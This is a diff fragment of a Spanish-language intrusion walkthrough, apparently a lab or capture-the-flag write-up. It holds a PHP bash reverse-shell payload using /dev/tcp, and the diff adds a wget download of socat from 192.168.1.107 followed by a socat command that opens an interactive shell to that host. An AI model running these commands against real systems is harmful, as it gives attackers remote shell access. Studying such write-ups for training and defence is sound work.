@@ -45,4 +45,5 @@ inversa mediante un fichero php.
   · <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");?>
  - Ese código establecerá una shell inversa a nuestra máquina.
 20. Una vez tenemos la shell inversa, navegamos hasta el directorio /home/user de la víctima y encontramos
-
+wget http://192.168.1.107/socat
+./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.107:4567
